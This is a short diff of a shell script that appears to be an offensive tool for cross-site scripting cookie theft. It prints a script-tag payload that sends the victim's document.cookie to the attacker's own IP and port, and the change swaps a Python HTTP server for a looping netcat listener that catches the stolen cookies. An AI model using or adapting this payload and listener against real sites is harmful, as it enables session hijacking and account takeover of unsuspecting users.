@@ -42,4 +42,8 @@ echo "><script>document.location='http://$ip:$port/?'+document.cookie</script>"
 echo -e "\n---------------------------------------------------------------------------------------\n"
 
 #Start HTTP Server
-python3 -m http.server $port
+echo -e "${GREEN}[+] ${ENDCOLOR}Starting HTTP Server"
+while :
+   do
+        nc -lvp $port 
+   done
